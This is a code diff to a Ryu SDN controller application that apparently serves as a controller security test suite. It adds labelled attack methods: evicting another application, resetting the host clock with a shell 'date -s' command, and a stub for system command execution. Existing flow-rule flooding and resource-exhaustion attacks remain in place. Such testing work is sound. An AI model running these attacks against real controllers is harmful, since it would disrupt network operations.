@@ -9,7 +9,7 @@ from ryu.lib.packet import ethernet
 from ryu.controller import dpset
 from ryu.ofproto import ofproto_v1_3
 from ryu.controller import conf_switch
-import sys
+import sys, os
 import array
 import itertools
 
@@ -25,7 +25,6 @@ class AppAgent13(app_manager.RyuApp):
         self.dpset = kwargs['dpset']
         self.switchset = kwargs['switchset']
         self.drop = 0
-        self.modify = 0
         self.clear = 0
         self.msg = None
 
@@ -42,7 +41,7 @@ class AppAgent13(app_manager.RyuApp):
         self.drop = 1
 
     # 3.1.020 drop
-    # TODO: any good idea to drop the packet-in?
+    # TODO: unchained structure
     def callControlMessageDrop(self):
         pkt = packet.Packet(self.msg.data)
         eth = pkt.get_protocols(ethernet.ethernet)[0]
@@ -106,12 +105,17 @@ class AppAgent13(app_manager.RyuApp):
             dp.send_msg(flow_mod)
 
     # 3.1.090
-    # TODO: How to manage the error when the attack is started.
+    # TODO:
     def testEventListenerUnsubscription(self):
         self.logger.info("[ATTACK] Event Listener Unsubscription")
-        del ofp_event._OFP_MSG_EVENTS['EventOFPPacketIn']
-        self.logger.info("Unsubscription of EventOFPPacketIn")
 
+    # 3.1.100
+    def testApplicationEviction(self):
+        self.logger.info("[ATTACK] Application Eviction")
+        app_name = "SimpleSwitch13"
+        app_mgr = app_manager.AppManager.get_instance()
+        app_mgr.uninstantiate(app_name)
+        return app_name
 
     # 3.1.110
     def testMemoryExhaustion(self):
@@ -131,6 +135,17 @@ class AppAgent13(app_manager.RyuApp):
         while True:
             x = x + 1
 
+    # 3.1.130
+    # TODO: This is PASS, it that true?
+    def testSystemVariableManipulation(self):
+        self.logger.info("[ATTACK] System Variable Manipulation")
+        os.system("date -s '1 JAN 1999'")
+
+    # 3.1.140
+    def testSystemCommandExecution(self):
+        self.logger.info("[ATTACK] System Command Execution")
+        sys.exit(1)
+
     # 3.1.190
     def testFlowRuleFlooding(self):
         for dp in self.dpset.dps.values():
@@ -142,7 +157,12 @@ class AppAgent13(app_manager.RyuApp):
                 dp.send_msg(flow_mod)
                 count = count + 1
 
-    @set_ev_cls(ofp_event.EventOFPPacketIn , MAIN_DISPATCHER)
+    # 3.1.200
+    # TODO:
+    def testSwitchFirmwareMisuse(self):
+        return
+
+    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)
     def packetIn_handler(self, ev):
         self.msg = ev.msg
 
